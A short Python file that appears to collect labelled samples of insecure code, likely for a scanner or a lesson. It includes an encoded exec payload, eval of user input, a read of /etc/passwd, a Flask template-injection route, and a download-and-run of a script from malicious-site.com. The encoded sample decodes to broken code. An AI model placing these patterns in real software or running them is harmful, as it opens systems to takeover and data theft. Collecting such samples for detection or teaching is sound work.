# 1. Obfuscated Code Execution (Base64-encoded payload)
import base64
exec(base64.b64decode('aW1wb3J0IHN5cytzdWIgc3VicHJvY2VzOyBzdWJwcm9jZXMuY2FsbCgnbHMnKQ=='))

# 2. Dynamic Code Execution (User-controlled eval)
user_input = input("Enter command: ")
eval(user_input)  # Dangerous: allows arbitrary execution

# 3. Suspicious File Operations (Reading sensitive files)
with open('/etc/passwd', 'r') as f:
    print(f.read())

# 4. Code Injection & Template Injection
from flask import Flask, request, render_template_string

app = Flask(__name__)
@app.route("/")
def index():
    user_input = request.args.get("name", "")
    return render_template_string("<h1>Hello {}!</h1>".format(user_input))  # Potential SSTI

# 5. Payload Download & Execution
import os, urllib.request
url = 'http://malicious-site.com/payload.sh'
filename = 'payload.sh'
urllib.request.urlretrieve(url, filename)
os.system(f"bash {filename}")  # Executes downloaded payload
